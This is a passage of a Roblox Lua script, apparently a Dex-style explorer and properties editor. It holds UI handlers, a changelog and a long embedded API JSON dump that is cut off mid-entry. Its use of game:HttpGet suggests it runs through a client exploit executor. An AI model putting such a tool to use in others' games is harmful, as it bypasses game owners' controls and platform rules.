	if key.KeyCode == Enum.KeyCode.LeftShift then
		HoldingShift = false
	end
end)

while RbxApi == nil do
	RbxApi = GetApiRemote:Invoke()
	wait()
end

explorerFilter.Changed:connect(function(prop)
	if prop == "Text" then
		rawUpdateList()
	end
end)

CurrentInsertObjectWindow = CreateInsertObjectMenu(
	GetClasses(),
	"",
	false,
	function(option)
		CurrentInsertObjectWindow.Visible = false
		local list = SelectionVar():Get()
		for i = 1,#list do
			pcall(function() Instance.new(option,list[i]) end)
		end
		DestroyRightClick()
	end
)
end)
spawn(function()
	--[[
	
Change log:

09/18
	Fixed checkbox mouseover sprite
	Encapsulated checkbox creation into separate method
	Fixed another checkbox issue

09/15
	Invalid input is ignored instead of setting to default of that data type
	Consolidated control methods and simplified them
	All input goes through ToValue method
	Fixed position of BrickColor palette
	Made DropDown appear above row if it would otherwise exceed the page height
	Cleaned up stylesheets

09/14
	Made properties window scroll when mouse wheel scrolled
	Object/Instance and Color3 data types handled properly
	Multiple BrickColor controls interfering with each other fixed
	Added support for Content data type
	
--]]

wait(0.2)

local print = function(s)
	print(tostring(s))
end

-- Services
local Teams = game:GetService("Teams")
local Workspace = game:GetService("Workspace")
local Debris = game:GetService("Debris")
local ContentProvider = game:GetService("ContentProvider")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Functions
function httpGet(url)
	return game:HttpGet(url,true)
end

-- RbxApi Stuff

local apiUrl = "http://anaminus.github.io/rbx/json/api/latest.json"
local maxChunkSize = 100 * 1000
local ApiJson
if script:FindFirstChild("RawApiJson") then
	ApiJson = script.RawApiJson
else
	ApiJson = ""
end


function getLocalApiJson()
	local rawApiJson = [===[
	[{"Superclass":null,"type":"Class","Name":"Instance","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Archivable","tags":[],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"ClassName","tags":["readonly"],"Class":"Instance"},{"ValueType":"int","type":"Property","Name":"DataCost","tags":["RobloxPlaceSecurity","readonly"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"Name","tags":[],"Class":"Instance"},{"ValueType":"Object","type":"Property","Name":"Parent","tags":[],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"RobloxLocked","tags":["PluginSecurity"],"Class":"Instance"},{"ValueType":"bool","type":"Property","Name":"archivable","tags":["hidden"],"Class":"Instance"},{"ValueType":"string","type":"Property","Name":"className","tags":["deprecated","readonly"],"Class":"Instance"},{"ReturnType":"void","Arguments":[],"Name":"ClearAllChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"Clone","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Destroy","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"FindFirstChild","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetChildren","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"scopeLength","Default":"4"}],"Name":"GetDebugId","tags":["PluginSecurity","notbrowsable"],"Class":"Instance","type":"Function"},{"ReturnType":"string","Arguments":[],"Name":"GetFullName","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"IsA","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"descendant","Default":null}],"Name":"IsAncestorOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"IsDescendantOf","tags":[],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"children","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"clone","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"destroy","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"findFirstChild","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"getChildren","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"string","Name":"className","Default":null}],"Name":"isA","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"ancestor","Default":null}],"Name":"isDescendantOf","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"remove","tags":["deprecated"],"Class":"Instance","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"childName","Default":null}],"Name":"WaitForChild","tags":[],"Class":"Instance","type":"YieldFunction"},{"Arguments":[{"Name":"child","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"AncestryChanged","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"property","Type":"Property"}],"Name":"Changed","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"ChildRemoved","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantAdded","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"descendant","Type":"Instance"}],"Name":"DescendantRemoving","tags":[],"Class":"Instance","type":"Event"},{"Arguments":[{"Name":"child","Type":"Instance"}],"Name":"childAdded","tags":["deprecated"],"Class":"Instance","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Accoutrement","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AttachmentForward","tags":[],"Class":"Accoutrement"},{"ValueType":"CoordinateFrame","type":"Property","Name":"AttachmentPoint","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentPos","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentRight","tags":[],"Class":"Accoutrement"},{"ValueType":"Vector3","type":"Property","Name":"AttachmentUp","tags":[],"Class":"Accoutrement"},{"Superclass":"Accoutrement","type":"Class","Name":"Accessory","tags":[]},{"Superclass":"Accoutrement","type":"Class","Name":"Hat","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"AdService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"ShowVideoAd","tags":[],"Class":"AdService","type":"Function"},{"Arguments":[{"Name":"adShown","Type":"bool"}],"Name":"VideoAdClosed","tags":[],"Class":"AdService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AdvancedDragger","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animation","tags":[]},{"ValueType":"Content","type":"Property","Name":"AnimationId","tags":[],"Class":"Animation"},{"Superclass":"Instance","type":"Class","Name":"AnimationController","tags":[]},{"ReturnType":"Array","Arguments":[],"Name":"GetPlayingAnimationTracks","tags":[],"Class":"AnimationController","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"AnimationController","type":"Function"},{"Arguments":[{"Name":"animationTrack","Type":"Instance"}],"Name":"AnimationPlayed","tags":[],"Class":"AnimationController","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrack","tags":[]},{"ValueType":"Object","type":"Property","Name":"Animation","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"bool","type":"Property","Name":"IsPlaying","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"Length","tags":["readonly"],"Class":"AnimationTrack"},{"ValueType":"AnimationPriority","type":"Property","Name":"Priority","tags":[],"Class":"AnimationTrack"},{"ValueType":"float","type":"Property","Name":"TimePosition","tags":[],"Class":"AnimationTrack"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"speed","Default":"1"}],"Name":"AdjustSpeed","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"AdjustWeight","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"double","Arguments":[{"Type":"string","Name":"keyframeName","Default":null}],"Name":"GetTimeOfKeyframe","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"},{"Type":"float","Name":"weight","Default":"1"},{"Type":"float","Name":"speed","Default":"1"}],"Name":"Play","tags":[],"Class":"AnimationTrack","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"fadeTime","Default":"0.100000001"}],"Name":"Stop","tags":[],"Class":"AnimationTrack","type":"Function"},{"Arguments":[{"Name":"keyframeName","Type":"string"}],"Name":"KeyframeReached","tags":[],"Class":"AnimationTrack","type":"Event"},{"Arguments":[],"Name":"Stopped","tags":["deprecated"],"Class":"AnimationTrack","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"AnimationTrackState","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Animator","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"animation","Default":null}],"Name":"LoadAnimation","tags":[],"Class":"Animator","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"AssetService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"revertUrl","Default":null}],"Name":"SetAssetRevertUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"versionsUrl","Default":null}],"Name":"SetAssetVersionsUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"accessUrl","Default":null}],"Name":"SetPlaceAccessUrl","tags":["LocalUserSecurity"],"Class":"AssetService","type":"Function"},{"ReturnType":"int","Arguments":[{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"string","Name":"placeName","Default":null},{"Type":"int","Name":"templatePlaceID","Default":null},{"Type":"string","Name":"description","Default":""}],"Name":"CreatePlaceInPlayerInventoryAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"pageNum","Default":"1"}],"Name":"GetAssetVersions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"int","Arguments":[{"Type":"int","Name":"creationID","Default":null}],"Name":"GetCreatorAssetID","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGamePlacesAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"Dictionary","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"GetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"int","Name":"versionNumber","Default":null}],"Name":"RevertAsset","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"void","Arguments":[],"Name":"SavePlaceAsync","tags":[],"Class":"AssetService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"placeId","Default":null},{"Type":"AccessType","Name":"accessType","Default":"Everyone"},{"Type":"Array","Name":"inviteList","Default":"{}"}],"Name":"SetPlacePermissions","tags":[],"Class":"AssetService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"Attachment","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Axis","tags":[],"Class":"Attachment"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"SecondaryAxis","tags":[],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldAxis","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldPosition","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldRotation","tags":["readonly"],"Class":"Attachment"},{"ValueType":"Vector3","type":"Property","Name":"WorldSecondaryAxis","tags":["readonly"],"Class":"Attachment"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetAxis","tags":[],"Class":"Attachment","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"axis","Default":null}],"Name":"SetSecondaryAxis","tags":[],"Class":"Attachment","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"BadgeService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetAwardBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"seconds","Default":null}],"Name":"SetHasBadgeCooldown","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetHasBadgeUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeDisabledUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetIsBadgeLegalUrl","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"placeId","Default":null}],"Name":"SetPlaceId","tags":["LocalUserSecurity"],"Class":"BadgeService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"AwardBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsDisabled","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"badgeId","Default":null}],"Name":"IsLegal","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"badgeId","Default":null}],"Name":"UserHasBadge","tags":[],"Class":"BadgeService","type":"YieldFunction"},{"Arguments":[{"Name":"message","Type":"string"},{"Name":"userId","Type":"int"},{"Name":"badgeId","Type":"int"}],"Name":"BadgeAwarded","tags":["RobloxScriptSecurity"],"Class":"BadgeService","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BasePlayerGui","tags":[]},{"Superclass":"BasePlayerGui","type":"Class","Name":"CoreGui","tags":["notCreatable","notbrowsable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":["RobloxScriptSecurity"],"Class":"CoreGui"},{"ValueType":"int","type":"Property","Name":"Version","tags":["readonly"],"Class":"CoreGui"},{"Superclass":"BasePlayerGui","type":"Class","Name":"PlayerGui","tags":["notCreatable"]},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"PlayerGui"},{"ReturnType":"float","Arguments":[],"Name":"GetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"transparency","Default":null}],"Name":"SetTopbarTransparency","tags":[],"Class":"PlayerGui","type":"Function"},{"Arguments":[{"Name":"transparency","Type":"float"}],"Name":"TopbarTransparencyChangedSignal","tags":[],"Class":"PlayerGui","type":"Event"},{"Superclass":"BasePlayerGui","type":"Class","Name":"StarterGui","tags":[]},{"ValueType":"bool","type":"Property","Name":"ResetPlayerGuiOnSpawn","tags":[],"Class":"StarterGui"},{"ValueType":"bool","type":"Property","Name":"ShowDevelopmentGui","tags":[],"Class":"StarterGui"},{"ReturnType":"bool","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null}],"Name":"GetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"getFunction","Default":null}],"Name":"RegisterGetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Function","Name":"setFunction","Default":null}],"Name":"RegisterSetCore","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"parameterName","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetCore","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoreGuiType","Name":"coreGuiType","Default":null},{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetCoreGuiEnabled","tags":[],"Class":"StarterGui","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"parameterName","Default":null}],"Name":"GetCore","tags":[],"Class":"StarterGui","type":"YieldFunction"},{"Arguments":[{"Name":"coreGuiType","Type":"CoreGuiType"},{"Name":"enabled","Type":"bool"}],"Name":"CoreGuiChangedSignal","tags":["RobloxScriptSecurity"],"Class":"StarterGui","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BinaryStringValue","tags":[]},{"Superclass":"Instance","type":"Class","Name":"BindableEvent","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Fire","tags":[],"Class":"BindableEvent","type":"Function"},{"Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"Event","tags":[],"Class":"BindableEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BindableFunction","tags":[]},{"ReturnType":"Tuple","Arguments":[{"Type":"Tuple","Name":"arguments","Default":null}],"Name":"Invoke","tags":[],"Class":"BindableFunction","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Name":"arguments","Type":"Tuple"}],"Name":"OnInvoke","tags":[],"Class":"BindableFunction","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"BodyMover","tags":[]},{"Superclass":"BodyMover","type":"Class","Name":"BodyAngularVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"AngularVelocity","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"angularvelocity","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyAngularVelocity"},{"Superclass":"BodyMover","type":"Class","Name":"BodyForce","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyForce"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyForce"},{"Superclass":"BodyMover","type":"Class","Name":"BodyGyro","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"BodyGyro"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyGyro"},{"ValueType":"CoordinateFrame","type":"Property","Name":"cframe","tags":["deprecated"],"Class":"BodyGyro"},{"ValueType":"Vector3","type":"Property","Name":"maxTorque","tags":["deprecated"],"Class":"BodyGyro"},{"Superclass":"BodyMover","type":"Class","Name":"BodyPosition","tags":[]},{"ValueType":"float","type":"Property","Name":"D","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyPosition"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyPosition"},{"ValueType":"Vector3","type":"Property","Name":"position","tags":["deprecated"],"Class":"BodyPosition"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyPosition","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":["deprecated"],"Class":"BodyPosition","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"BodyPosition","type":"Event"},{"Superclass":"BodyMover","type":"Class","Name":"BodyThrust","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"Force","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"Location","tags":[],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"force","tags":["deprecated"],"Class":"BodyThrust"},{"ValueType":"Vector3","type":"Property","Name":"location","tags":["deprecated"],"Class":"BodyThrust"},{"Superclass":"BodyMover","type":"Class","Name":"BodyVelocity","tags":[]},{"ValueType":"Vector3","type":"Property","Name":"MaxForce","tags":[],"Class":"BodyVelocity"},{"ValueType":"float","type":"Property","Name":"P","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"maxForce","tags":["deprecated"],"Class":"BodyVelocity"},{"ValueType":"Vector3","type":"Property","Name":"velocity","tags":["deprecated"],"Class":"BodyVelocity"},{"ReturnType":"Vector3","Arguments":[],"Name":"GetLastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"ReturnType":"Vector3","Arguments":[],"Name":"lastForce","tags":[],"Class":"BodyVelocity","type":"Function"},{"Superclass":"BodyMover","type":"Class","Name":"RocketPropulsion","tags":[]},{"ValueType":"float","type":"Property","Name":"CartoonFactor","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxSpeed","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"MaxThrust","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"MaxTorque","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Object","type":"Property","Name":"Target","tags":[],"Class":"RocketPropulsion"},{"ValueType":"Vector3","type":"Property","Name":"TargetOffset","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TargetRadius","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"ThrustP","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnD","tags":[],"Class":"RocketPropulsion"},{"ValueType":"float","type":"Property","Name":"TurnP","tags":[],"Class":"RocketPropulsion"},{"ReturnType":"void","Arguments":[],"Name":"Abort","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Fire","tags":[],"Class":"RocketPropulsion","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"fire","tags":["deprecated"],"Class":"RocketPropulsion","type":"Function"},{"Arguments":[],"Name":"ReachedTarget","tags":[],"Class":"RocketPropulsion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BoolValue","tags":[]},{"ValueType":"bool","type":"Property","Name":"Value","tags":[],"Class":"BoolValue"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"Changed","tags":[],"Class":"BoolValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"bool"}],"Name":"changed","tags":["deprecated"],"Class":"BoolValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"BrickColorValue","tags":[]},{"ValueType":"BrickColor","type":"Property","Name":"Value","tags":[],"Class":"BrickColorValue"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"Changed","tags":[],"Class":"BrickColorValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"BrickColor"}],"Name":"changed","tags":["deprecated"],"Class":"BrickColorValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Button","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"active","Default":null}],"Name":"SetActive","tags":["PluginSecurity"],"Class":"Button","type":"Function"},{"Arguments":[],"Name":"Click","tags":["PluginSecurity"],"Class":"Button","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CFrameValue","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"Value","tags":[],"Class":"CFrameValue"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"Changed","tags":[],"Class":"CFrameValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"CoordinateFrame"}],"Name":"changed","tags":["deprecated"],"Class":"CFrameValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CacheableContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"MeshContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"SolidModelContentProvider","tags":[]},{"Superclass":"CacheableContentProvider","type":"Class","Name":"TextureContentProvider","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Camera","tags":[]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"Camera"},{"ValueType":"Object","type":"Property","Name":"CameraSubject","tags":[],"Class":"Camera"},{"ValueType":"CameraType","type":"Property","Name":"CameraType","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","hidden"],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"FieldOfView","tags":[],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"Focus","tags":[],"Class":"Camera"},{"ValueType":"bool","type":"Property","Name":"HeadLocked","tags":[],"Class":"Camera"},{"ValueType":"float","type":"Property","Name":"HeadScale","tags":[],"Class":"Camera"},{"ValueType":"Vector2","type":"Property","Name":"ViewportSize","tags":["readonly"],"Class":"Camera"},{"ValueType":"CoordinateFrame","type":"Property","Name":"focus","tags":["deprecated"],"Class":"Camera"},{"ReturnType":"float","Arguments":[],"Name":"GetPanSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetTiltSpeed","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"endPos","Default":null},{"Type":"CoordinateFrame","Name":"endFocus","Default":null},{"Type":"float","Name":"duration","Default":null}],"Name":"Interpolate","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"PanUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ScreenPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CameraPanMode","Name":"mode","Default":"Classic"}],"Name":"SetCameraPanMode","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"rollAngle","Default":null}],"Name":"SetRoll","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"units","Default":null}],"Name":"TiltUnits","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Ray","Arguments":[{"Type":"float","Name":"x","Default":null},{"Type":"float","Name":"y","Default":null},{"Type":"float","Name":"depth","Default":"0"}],"Name":"ViewportPointToRay","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToScreenPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Vector3","Name":"worldPoint","Default":null}],"Name":"WorldToViewportPoint","tags":[],"Class":"Camera","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"float","Name":"distance","Default":null}],"Name":"Zoom","tags":["RobloxScriptSecurity"],"Class":"Camera","type":"Function"},{"Arguments":[{"Name":"entering","Type":"bool"}],"Name":"FirstPersonTransition","tags":["RobloxPlaceSecurity"],"Class":"Camera","type":"Event"},{"Arguments":[],"Name":"InterpolationFinished","tags":[],"Class":"Camera","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ChangeHistoryService","tags":["notCreatable"]},{"ReturnType":"Tuple","Arguments":[],"Name":"GetCa